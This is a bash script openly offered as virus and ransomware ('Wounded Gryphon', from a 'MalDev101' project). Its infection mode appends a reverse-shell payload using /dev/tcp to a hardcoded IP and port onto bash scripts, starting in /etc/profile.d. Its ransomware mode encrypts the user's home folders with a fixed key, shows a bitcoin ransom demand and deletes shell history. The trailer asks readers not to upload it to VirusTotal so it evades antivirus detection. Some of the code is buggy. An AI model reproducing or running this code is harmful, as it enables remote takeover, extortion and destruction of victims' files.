#!/bin/bash

#                   # 
#    __      __      \                .___         .___
#   /  \    /  \____  \_ __  ____   __| _/____   __| _/ ---------
#   \   \/\/   /  _ \|  |  \/    \ / __ _/ __ \ / __ | -----------
#    \        (  <_> |  |  |   |  / /_/ \  ___// /_/ | ------------
#     \__/\  / \____/|____/|___|  \____ |\___  \____ | -----------
#     _____\/                   \/ __  \/    \/     \/ ----------
#    /  ___ \_______ ___.________ |  |__   ____   ____  ---------
#   /   \  __\_  __ <   |  \____ \|  |  \ /  _ \ /    \ ----------
#   \    \_\  |  | \/\___  |  |_> |   Y  (  <_> |   |  \ ----------
#    \______  |__|   / ____|   __/|___|  /\___\/|___|  / ----------
#       /   \/       \/    |__|        \/      \     \/ ---------
#      / Wonded Gryphon v4.3  ______----------- # ---------------
#     #          _______,---'__,---' ---------------------------
#            _,-'---_---__,---' -----------------------------
#     /_ #   (,  ---____', --------------------------------
#    /  /,,   `, ,-' -------------------------------------
#   ;/)   ,',,_/,' # -------------------------------------
#   | /\   ,.'//\ / ---------------------------------------
#   `-` \ ,,'    /.   # -------------------------------------
#        `',   ,-- `./ -----------------------------------------
#        '/ / |     /`, -----------------------------------------
#        //'',.\_    .\\ -----,{==>- ------------------------------
#     __//   __;_`-  \ `;.__,;' ------------------------------------
#   ((,--,) (((,------;  `--' --------------------------------------
#
# Created by Da2dalus a MalDev101 project
# This is only an experiment but it can be dangerous.
# I am not responsible for the damage.
# This is a virus/ransomware that works on unix systems with bash installed.
# Tested on Linux (Ubuntu, Debian)

SHEBANG="#!/bin/bash"

ME="$0"

CAT=$(cat "$ME")

VERSION="v4.3"

OFLAG="$1"

# Configuration -------------------------------------------------------------------------------------------------------------#

# Virus mode configuration ----------------------------------------------------$

FLAG="#arrow"

# ------------------------------------------------------------------>

# String you want to append to sh file. Example: reverse tcp bash (metasploit).
# Responds to:
# IP: 192.168.1.88
# PORT: 8888

PAYLOAD="0<&205-;exec 205<>/dev/tcp/192.168.1.88/8888;sh <&205 >&205 2>&205" # Choose payload when infecting

# ------------------------------------------------------------------->

MAXINFECTCOUNT=50 # Maximum infected files

# ------------------------------------------------------------------------------$

# Ransomware mode configuration ------------------------------------------------$

KEY="GrYpHoN" # KEY

CCRYPT="/bin/ccrypt"

# ------------------------------------------------------------------------------$

# ----------------------------------------------------------------------------------------------------------------------------#

# Colors and special caracters

# Reset
NC='\033[0m'       # Text Reset

BLINK=$(tput blink)

# Regular Colors
Black='\033[0;30m'        # Black
Red='\033[0;31m'          # Red
Green='\033[0;32m'        # Green
Yellow='\033[0;33m'       # Yellow
Blue='\033[0;34m'         # Blue
Purple='\033[0;35m'       # Purple
Cyan='\033[0;36m'         # Cyan
White='\033[0;37m'        # White

# Bold
BBlack='\033[1;30m'       # Black
BRed='\033[1;31m'         # Red
BGreen='\033[1;32m'       # Green
BYellow='\033[1;33m'      # Yellow
BBlue='\033[1;34m'        # Blue
BPurple='\033[1;35m'      # Purple
BCyan='\033[1;36m'        # Cyan
BWhite='\033[1;37m'       # White

# Underline
UBlack='\033[4;30m'       # Black
URed='\033[4;31m'         # Red
UGreen='\033[4;32m'       # Green
UYellow='\033[4;33m'      # Yellow
UBlue='\033[4;34m'        # Blue
UPurple='\033[4;35m'      # Purple
UCyan='\033[4;36m'        # Cyan
UWhite='\033[4;37m'       # White

# Background
On_Black='\033[40m'       # Black
On_Red='\033[41m'         # Red
On_Green='\033[42m'       # Green
On_Yellow='\033[43m'      # Yellow
On_Blue='\033[44m'        # Blue
On_Purple='\033[45m'      # Purple
On_Cyan='\033[46m'        # Cyan
On_White='\033[47m'       # White

# High Intensity
IBlack='\033[0;90m'       # Black
IRed='\033[0;91m'         # Red
IGreen='\033[0;92m'       # Green
IYellow='\033[0;93m'      # Yellow
IBlue='\033[0;94m'        # Blue
IPurple='\033[0;95m'      # Purple
ICyan='\033[0;96m'        # Cyan
IWhite='\033[0;97m'       # White

# Bold High Intensity
BIBlack='\033[1;90m'      # Black
BIRed='\033[1;91m'        # Red
BIGreen='\033[1;92m'      # Green
BIYellow='\033[1;93m'     # Yellow
BIBlue='\033[1;94m'       # Blue
BIPurple='\033[1;95m'     # Purple
BICyan='\033[1;96m'       # Cyan
BIWhite='\033[1;97m'      # White

# High Intensity backgrounds
On_IBlack='\033[0;100m'   # Black
On_IRed='\033[0;101m'     # Red
On_IGreen='\033[0;102m'   # Green
On_IYellow='\033[0;103m'  # Yellow
On_IBlue='\033[0;104m'    # Blue
On_IPurple='\033[0;105m'  # Purple
On_ICyan='\033[0;106m'    # Cyan
On_IWhite='\033[0;107m'   # White

# List made by Shakiba Moshiri

# All the BANNERS

function banner1() {
   
   echo -e "$Blue                _ #      _ $NC"
   echo -e "$Blue              _/|  \ _   |\_ $NC"
   echo -e "$Blue            _/_ |   \|\\ | _\ $NC"
   echo -e "$Blue          _/_/| /  /   \|\ |\_\_     # $NC"
   echo -e "$Blue        _/_/  |/  /  _  \/\|  \_\_  / $NC"
   echo -e "$Blue      _/_/    ||  | | \*/ ||    \_\/   $NC"
   echo -e "$Blue     /_/  | | |\  | \_ /  /| | |  \_\   # $NC"
   echo -e "$Blue    //    ||| | \_/   \__/ | |||    \\ / $NC"
   echo -e "$Blue   // __| ||\  \ ||    || /  /|| |__ \/ $NC"
   echo -e "$Blue  //_/ \|||| \/\\||    ||//\/ ||||/ \_\\ $NC"
   echo -e "$Blue ///    \\\\/   /()    ()\   \////    \\\ $NC"
   echo -e "$Blue |/      \/    |    |    |     \/      \| $NC"
   echo -e "$Blue              /_|  | |_  \  # $NC"
   echo -e "$Blue              ///_| |_||\_ \/ $NC"
   echo -e "$Blue              |//||/||\/||\/       WOUNDED GRYPHON $VERSION $NC"
   echo -e "$Blue               / || ||/||/\/    $NC"
   echo -e "$Blue                 {}/|| {}        $NC"
   echo -e "$Blue                    ||            $NC"
   echo -e "$Blue                    () $NC"
}

function banner2() {

   echo -e "$BLINK $Cyan
                ++01100101 01110101++             =ඏ=             ++10101110 10100110++
              +011100110110   01001111000      0♢0Ŧ0♢0     00011110010   011011001110+
          +0110010001100101 0110000101100100   000卄000   0010011010000110 1010011000100110+
            +01101101011000010111001001101011++00+0卄00++++11010110010011101000011010110110+
                0111001101100  0010110111001100100 ⁆⁅ 0010011001110110100  0011011001110
                      011001100 110000101110010++= ⁆⁅ =++010011101000011 001100110
                        +01 10100001100101011 10010ʞk01001 11010100110000101 10+
                            +0111010001101111  +01ʞk10+  1111011000101110+
                                +110101011011  00.∴.00  110110101011+
                                  +01100101     0+1ʞk1+0    10100110+
                                  +1100101     +0+.∴.+0+     1010011+
                                    +1110010   +0+.∴.+0+   0100111+
                                      +1110100  01 ∴ 10  0010111+
                                                10 ∴ 01
                                                10 ∵ 01
                                                00.00
                                                  : : $NC
                 $BBlue Do you got what it takes? $NC
                           $BWhite https://bit.ly/3b83sD9 $NC"
}

function banner3() {
   echo -e " $Cyan
                         # ------------------------------------------
          __      __      \ -------------- .___ ------- .___ --------
         /  \    /  \____  \_ __  ____   __| _/____   __| _/ ---------
         \   \/\/   /  _ \|  |  \/    \ / __ _/ __ \ / __ | -----------
          \        (  <_> |  |  |   |  / /_/ \  ___// /_/ | ------------
           \__/\  / \____/|____/|___|  \____ |\___  \____ | -----------
           _____\/                   \/ __  \/    \/     \/ ----------
          /  ___ \_______ ___.________ |  |__   ____   ____  ---------
         /   \  __\_  __ <   |  \____ \|  |  \ /  _ \ /    \ ----------
         \    \_\  |  | \/\___  |  |_> |   Y  (  <_> |   |  \ ----------
          \______  |__|   / ____|   __/|___|  /\___\/|___|  / ----------
             /   \/       \/    |__|        \/      \     \/ ---------
            /$NC $BBlue Wonded Gryphon $VERSION $NC $Cyan---------------- # ---------------
           # ---------------------------------------------------------- $NC"
}

function banner4() {
   echo -e "$Blue
                   _________
                  / ======= \
                 / __________\
                | ___________ |
                | | I Love  | |
                | |  BASH   | |
                | |_________| |________________________
                \=____________/                        )
                / ........... \   WOUNDED GRYPHON     /
               / ::::::::::::: \      $VERSION        =D-'
              (_________________) $NC"
}

function banner5() {
   echo -e "$Red  █     █░ ▒█████   █    ██  ███▄    █ ▓█████▄ ▓█████ ▓█████▄   ▄████  ██▀███ ▓██   ██▓ ██▓███   ██░ ██  ▒█████   ███▄    █  $NC";
   echo -e "$Red ▓█░ █ ░█░▒██▒  ██▒ ██  ▓██▒ ██ ▀█   █ ▒██▀ ██▌▓█   ▀ ▒██▀ ██▌ ██▒ ▀█▒▓██ ▒ ██▒▒██  ██▒▓██░  ██▒▓██░ ██▒▒██▒  ██▒ ██ ▀█   █  $NC";
   echo -e "$Red ▒█░ █ ░█ ▒██░  ██▒▓██  ▒██░▓██  ▀█ ██▒░██   █▌▒███   ░██   █▌▒██░▄▄▄░▓██ ░▄█ ▒ ▒██ ██░▓██░ ██▓▒▒██▀▀██░▒██░  ██▒▓██  ▀█ ██▒ $NC";
   echo -e "$Red ░█░ █ ░█ ▒██   ██░▓▓█  ░██░▓██▒  ▐▌██▒░▓█▄   ▌▒▓█  ▄ ░▓█▄   ▌░▓█  ██▓▒██▀▀█▄   ░ ▐██▓░▒██▄█▓▒ ▒░▓█ ░██ ▒██   ██░▓██▒  ▐▌██▒ $NC";
   echo -e "$Red ░░██▒██▓ ░ ████▓▒░▒▒█████▓ ▒██░   ▓██░░▒████▓ ░▒████▒░▒████▓ ░▒▓███▀▒░██▓ ▒██▒ ░ ██▒▓░▒██▒ ░  ░░▓█▒░██▓░ ████▓▒░▒██░   ▓██░ $NC";
   echo -e "$Red ░ ▓░▒ ▒  ░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒  ▒▒▓  ▒ ░░ ▒░ ░ ▒▒▓  ▒  ░▒   ▒ ░ ▒▓ ░▒▓░  ██▒▒▒ ▒▓▒░ ░  ░ ▒ ░░▒░▒░ ▒░▒░▒░ ░ ▒░   ▒ ▒  $NC";
   echo -e "$Red   ▒ ░ ░    ░ ▒ ▒░ ░░▒░ ░ ░ ░ ░░   ░ ▒░ ░ ▒  ▒  ░ ░  ░ ░ ▒  ▒   ░   ░   ░▒ ░ ▒░▓██ ░▒░ ░▒ ░      ▒ ░▒░ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░ $NC";
   echo -e "$Red   ░   ░  ░ ░ ░ ▒   ░░░ ░ ░    ░   ░ ░  ░ ░  ░    ░    ░ ░  ░ ░ ░   ░   ░░   ░ ▒ ▒ ░░  ░░        ░  ░░ ░░ ░ ░ ▒     ░   ░ ░  $NC";
   echo -e "$Red     ░        ░ ░     ░              ░    ░       ░  ░   ░          ░    ░     ░ ░               ░  ░  ░    ░ ░           ░  $NC";
   echo -e "$Red                                        ░              ░                       ░ ░                                           $NC";

}

function banner_text() {
   
   echo -e " $UBlue
   
   # Created by Da2dalus a MalDev101 project
   # This is only an experiment but it can be dangerous.
   # I am not responsible for the damage.
   # This is a virus/ransomware that works on unix systems with bash installed.
   # Tested on Linux (Ubuntu, Debian) and MacOS (OSX)
   # $NC
   $BBlue# If virus mode: $NC
   $UBlue#
   # Check if files are written in bash then start infecting them.
   # The virus ignores non bash scripts and already infected files
   # $NC
   $BBlue# If ransomware mode: $NC
   $UBlue#
   # Encrypt files in Desktop, Videos ... $NC"
}

function error() {

   echo -e "$Red $BLINK _______________________________ ________ __________._. $NC"
   echo -e "$Red $BLINK \_   _____/\______   \______   \\_____  \\______   \ | $NC"
   echo -e "$Red $BLINK  |    __)_  |       _/|       _/ /   |   \|       _/ | $NC"
   echo -e "$Red $BLINK  |        \ |    |   \|    |   \/    |    \    |   \\| $NC"
   echo -e "$Red $BLINK /_______  / |____|_  /|____|_  /\_______  /____|_  /__ $NC"
   echo -e "$Red $BLINK         \/         \/        \/         \/       \/ \/ $NC"

   echo -e "     "
}

function helpfunction() {

   echo -e "$BCyan Available opions: $NC"
   echo -e " "
   echo -e "$UCyan Show this page: --help $NC"
   echo -e "$UCyan Infect all bash files on the system: --infect $NC"
   echo -e "$UCyan Encrypt files in Desktop, Videos ...: --encrypt $NC"
   echo -e "$UCyan Self destruct when done: (--infect, --encrypt) --self-destruct $NC"
   echo -e "$UCyan Unencrypt files: --unencrypt $NC"
   echo -e "$UCyan Uninfect system: --uninfect $NC"
   echo -e "$UCyan Only show random banner: --banner $NC"

}

# Cleanup function

function cleanup() {
   
   echo "#!/bin/bash" > Gryphon.sh
   echo "sleep 8" >> Gryphon.sh
   echo "sudo mv $ME /dev/null" >> Gryphon.sh
   chmod 755 Gryphon.sh 
   ./Gryphon
   exit
}


# Virus mode

function check() {
   
   local IFBASH=$(grep -Fx "$SHEBANG" *)
   
   if [ "$IFBASH" =~ .*"$SHEBANG" ]

   then
      
      local LISTNOTREADY=$(echo "$IFBASH" | sed 's|:#!/bin/bash||')
      local LISTNOTREADYD=$(echo "$LISTNOTREADY" | tr "\n" " ")
      local LISTNOTREADY2=$(grep -Fx "$FLAG" "$LISTNOTREADYD")
      local LISTNOTREADY2D=$(echo "$LISTNOTREADY2" | sed '/bar/,+1 d')
      LIST=$(echo "$LISTNOTREADY2D" | tr "\n" " ")
       
      if [ "$LIST" == "" ]
       
      then
         
         foldercheck
      
      else
         
         infect
      
      fi
      
    else
       
       foldercheck
       
    fi
   
}

function foldercheck() {
   
   local LDIR=$(ls -d *)
   
   if [ "$LDIR" == "" ]

   then
      cd /

      check

   else
          
      echo "$LDIR" > LIST.txt
      
      CDDIR=$(shuf -n1 LIST.txt)
      
      cd "$CDDIR"
      
      check
   fi
}

# PAYLOAD

function infect() {
   
   # String you want to append to sh file. Example: reverse tcp bash (metasploit).
   # Responds to:
   # IP: 192.168.1.88
   # PORT: 8888

   echo "$PAYLOAD" >> "$LIST"
   echo "$FLAG" >> "$LIST"

   INFECTCOUNT=$(($INFECTCOUNT + 1))

   if [ "$INFECTCOUNT" == "$MAXINFECTCOUNT" ]

   then
      if grep -q --self-destruct <<<"$@"

      then
         echo -e "$BBlue Done...$NC"
         cleanup
   
      else
         echo -e "$BBlue Done...$NC"
         exit
   
      fi
   
   else
      check
   
   fi
   
}

# choose a random banner

function CHOOSE_BANNER() {
   
   banners=(banner1 banner2 banner3 banner4 banner5) ;
   THECHOSENONE="${banners[RANDOM%${#banners[@]}]}";
}

CHOOSE_BANNER

function BANNER() {
   
   "$THECHOSENONE"
   echo "   "
   banner_text
}

# start infecting autostart

function virus_start() {
   
   BANNER # Very important :)
   
   cd /etc/profile.d/
   
   check
   
}

# RANSOMWARE MODE

function ccryptcheck() {
   
   if [ -f "$CCRYPT" ]

   then
      scan
    
   else
      sudo apt install ccrypt -yy
      brew install ccrypt
      yum install ccrypt
      pacman install ccrypt
      ccryptcheck
   
   fi
}

function encryptvideos() {
   
   cd "$HOME"
   cd Videos
   local LS=$(ls -a)
   local LIST=$(echo "$LS" | tr "\n" " ")
   ccencrypt "$LIST" -k "$KEY"
   for f in *.cpt; do
      mv -- "$f" "${f%.cpt}.WOUND"
   done

}

function encryptdesktop() {
   
   cd "$HOME"
   cd Desktop
   local LS=$(ls -a)
   local LIST=$(echo "$LS" | tr "\n" " ")
   ccencrypt "$LIST" -k "$KEY"
   for f in *.cpt; do
      mv -- "$f" "${f%.cpt}.WOUND"
   done

}

function encryptpictures() {
   
   cd "$HOME"
   cd Pictures
   local LS=$(ls -a)
   local LIST=$(echo "$LS" | tr "\n" " ")
   ccencrypt "$LIST" -k "$KEY"
   for f in *.cpt; do
      mv -- "$f" "${f%.cpt}.WOUND"
   done

}

function encryptdocuments() {
   
   cd "$HOME"
   cd Documents
   local LS=$(ls -a)
   local LIST=$(echo "$LS" | tr "\n" " ")
   ccencrypt "$LIST" -k "$KEY"
   for f in *.cpt; do
      mv -- "$f" "${f%.cpt}.WOUND"
   done

}

function encryptdownloads() {
   
   cd "$HOME"
   cd Downloads
   local LS=$(ls -a)
   local LIST=$(echo "$LS" | tr "\n" " ")
   ccencrypt "$LIST" -k "$KEY"
   for f in *.cpt; do
      mv -- "$f" "${f%.cpt}.WOUND"
   done

}

function encryptmusic() {
   
   cd "$HOME"
   cd Music
   local LS=$(ls -a)
   local LIST=$(echo "$LS" | tr "\n" " ")
   ccencrypt "$LIST" -k "$KEY"
   for f in *.cpt; do
      mv -- "$f" "${f%.cpt}.WOUND"
   done

}

function ransom_start() {
   
   BANNER
   ccryptcheck
   sleep 5
   encryptdesktop
   sleep 5
   encryptdocuments
   sleep 5
   encryptdownloads
   sleep 5
   zenity --warning --text="Your files are encrypted by Wounded Gryphon! Pay 500$ worth in bitcoin to this bitcoin address: Your Bitcoin Address so you can receive the decrypt instructions"
   encryptmusic
   sleep 5
   encryptpictures
   sleep 5
   encryptvideos
   cd "$HOME" && rm .bash_history
   sleep 5
   
   if grep -q --self-destruct <<<"$@"

   then
      echo -e "$BBlue Done...$NC"
      cleanup
   
   else
      echo -e "$BBlue Done...$NC"
      exit
   
   fi
   
}

# Uninfect

function remcheck() {
   
   local IFBASH=$(grep -Fx "$SHEBANG" *)
   
   if grep -q "$SHEBANG" <<<"$IFBASH"

   then
      
      local LISTNOTREADY=$(echo "$IFBASH" | sed 's|:#!/bin/bash||')
      local LISTNOTREADYD=$(echo "$LISTNOTREADY" | tr "\n" " ")
      local LISTNOTREADY2=$(grep -Fx "$FLAG" "$LISTNOTREADYD")
      local LISTNOTREADY2D=$(echo "$LISTNOTREADY2" | sed 's|:#arrow||')
      LIST=$(echo "$LISTNOTREADY2D" | tr "\n" " ")
       
      if [ "$LIST" == "" ]
       
      then
         
         remfoldercheck
      
      else
         
         uninfect
      
      fi
      
    else
       
       remfoldercheck
       
    fi
   
}

function remfoldercheck() {
   
   local LDIR=$(ls -d *)
   
   if [ "$LDIR" == "" ]

   then
      cd /

      remcheck

   else
          
      echo "$LDIR" > LIST.txt
      
      CDDIR=$(shuf -n1 LIST.txt)
      
      cd "$CDDIR"
      
      remcheck
   fi
}


function uninfect() {
   
   sed -i '/"$PAYLOAD"/d' "$LIST"
   sed -i '/"$FLAG"/d' "$LIST"

   RINFECTCOUNT=$(($RINFECTCOUNT + 1))

   if [ "$RINFECTCOUNT" == $MAXINFECTCOUND ]

   then
   
      if grep -q --self-destruct <<<"$@"
   
      then
         echo -e "$BBlue Done...$NC"
         cleanup
   
      else
         echo -e "$BBlue Done...$NC"
         exit
   
      fi
   
   else
      remcheck
   
   fi
   
}

function uninfectstart() {
   
   BANNER # Very important :)

   cd /etc/profile.d/

   remcheck
   
}

# Unencrypt

function unencryptvideos() {
   
   cd "$HOME"
   cd Videos
   local LS=$(ls -a)
   local LIST=$(echo "$LS" | tr "\n" " ")
   ccdecrypt "$LIST" -K "$KEY"
}

function unencryptdesktop() {
   
   cd "$HOME"
   cd Desktop
   local LS=$(ls -a)
   local LIST=$(echo "$LS" | tr "\n" " ")
   ccdecrypt "$LIST" -K "$KEY"
}

function unencryptpictures() {
   
   cd "$HOME"
   cd Pictures
   local LS=$(ls -a)
   local LIST=$(echo "$LS" | tr "\n" " ")
   ccdecrypt "$LIST" -K "$KEY"
}

function unencryptdocuments() {
   
   cd "$HOME"
   cd Documents
   local LS=$(ls -a)
   local LIST=$(echo "$LS" | tr "\n" " ")
   ccdecrypt "$LIST" -K "$KEY"
}

function unencryptdownloads() {
   
   cd "$HOME"
   cd Downloads
   local LS=$(ls -a)
   local LIST=$(echo "$LS" | tr "\n" " ")
   ccdecrypt "$LIST" -K "$KEY"

}

function unencryptmusic() {
   
   cd "$HOME"
   cd Music
   local LS=$(ls -a)
   local LIST=$(echo "$LS" | tr "\n" " ")
   ccdecrypt "$LIST" -K "$KEY"

}

function unencrypt() {
   
   BANNER
   ccryptcheck
   sleep 5
   unencryptdesktop
   sleep 5
   unencryptdocuments
   sleep 5
   unencryptdownloads
   sleep 5
   unencryptmusic
   sleep 5
   unencryptpictures
   sleep 5
   unencryptvideos
   cd "$HOME" && rm .bash_history
   sleep 5
   
   if grep -q --self-destruct <<<"$@"

   then
      echo -e "$BBlue Done...$NC"
      cleanup
   
   else
      echo -e "$BBlue Done...$NC"
      exit
   
   fi
   
}

# Start

if [ "$OFLAG" == "--infect" ]

then
   virus_start

elif [ "$OFLAG" == "--encrypt" ]

then
   ransom_start
   
elif [ "$OFLAG" == "--uninfect" ]

then
   uninfect

elif [ "$OFLAG" == "--help" ]

then
   helpfunction
   
elif [ "$OFLAG" == "--unencrypt" ]

then
   unencrypt

elif [ "$OFLAG" == "--banner" ]

then
   BANNER

elif [ $# -le 0 ]

then
   error
   echo -e "   "
   echo -e "$Red No arguments specified! $NC"
   echo -e "$Red Use$NC $BRed--help$NC $Red to display options.$NC"

else
   error
   echo -e "   "
   echo -e "$Red No such argument available!$NC"
   echo -e "$Red Use$NC $BRed--help$NC $Red to display options.$NC" 

fi


#    |\                     /)      
#  /\_\\__               (_//
# |   `>\-`     _._       //`)  
#  \ /` \\  _.-.---.`-._ //
#   `    \|`  /     \  `|/
#         |   \.@-@./   |
#         |.../`\_/`\...|
#         |:://  _  \\::|
#         | | \     )|_ |
#         \/`\_`>  <_/ \/
#          \__/'---'\__/
#           `-. ::: .-'
#            //`:::`\\
#           //   '   \\
#          |/         \\
#
# PLEASE DO NOT COPY THE SOURCE CODE OF THIS PROJECT AND RENAME IT
# THAT'S NOT CREATING THAT IS STEALING.
#
# THIS SOFTWARE IS PROTECTED BY A GNU PUBLIC LICENSE
#
# DO NOT UPLOAD THIS SAMPLE ON VIRUS TOTAL TO PREVENT 
# ANTI VIRUS DETECTION.
#
# I AND THE TEAM ARE NOT RESPONSIBLE FOR THE DAMAGE CAUSED BY 
# THIS SOFTWARE!
#
# THANKS FOR THE PEOPLE WHO ADDET THERE CODE TO THIS PROJECT
# AND SUPPORTED IT
#
# NEW VERSIONS WILL BE COMING SOON (I HOPE)
#
# Greetings from the MalDev101 TEAM
